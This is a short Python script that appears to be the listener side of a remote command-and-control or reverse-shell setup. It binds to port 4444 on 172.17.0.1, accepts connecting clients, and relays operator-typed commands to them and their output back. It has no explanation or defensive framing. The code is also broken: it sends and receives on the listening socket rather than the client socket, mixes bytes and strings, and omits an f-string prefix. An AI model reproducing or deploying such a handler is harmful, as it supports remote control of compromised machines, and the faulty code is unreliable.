import socket
IP = "172.17.0.1"
PORT = 4444
clients = []
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind((IP, PORT))


def send():
    socket.listen(5)
    client_socket, client_addr = socket.accept()
    while True:
        clients.append(client_socket)
        print(client_addr)
        cmd = input(">>> ")

        for client in clients:
            socket.send(cmd.encode())
            output = socket.recv(1024)
            print(output + "Client [{client}]")


send()
